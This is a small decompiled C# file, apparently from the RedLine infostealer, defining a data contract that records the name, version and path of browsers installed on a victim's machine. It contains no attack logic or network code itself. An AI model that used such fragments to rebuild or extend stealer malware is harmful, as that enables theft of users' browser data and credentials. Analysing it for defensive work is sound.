using System;
using System.Runtime.Serialization;

namespace RedLine.Models
{
	// Token: 0x02000011 RID: 17
	[DataContract(Name = "InstalledBrowserInfo", Namespace = "v1/Models")]
	public class InstalledBrowserInfo
	{
		// Token: 0x17000026 RID: 38
		// (get) Token: 0x0600006A RID: 106 RVA: 0x00003486 File Offset: 0x00001686
		// (set) Token: 0x0600006B RID: 107 RVA: 0x0000348E File Offset: 0x0000168E
		[DataMember(Name = "Name")]
		public string Name { get; set; }

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x0600006C RID: 108 RVA: 0x00003497 File Offset: 0x00001697
		// (set) Token: 0x0600006D RID: 109 RVA: 0x0000349F File Offset: 0x0000169F
		[DataMember(Name = "Version")]
		public string Version { get; set; }

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x0600006E RID: 110 RVA: 0x000034A8 File Offset: 0x000016A8
		// (set) Token: 0x0600006F RID: 111 RVA: 0x000034B0 File Offset: 0x000016B0
		[DataMember(Name = "Path")]
		public string Path { get; set; }
	}
}
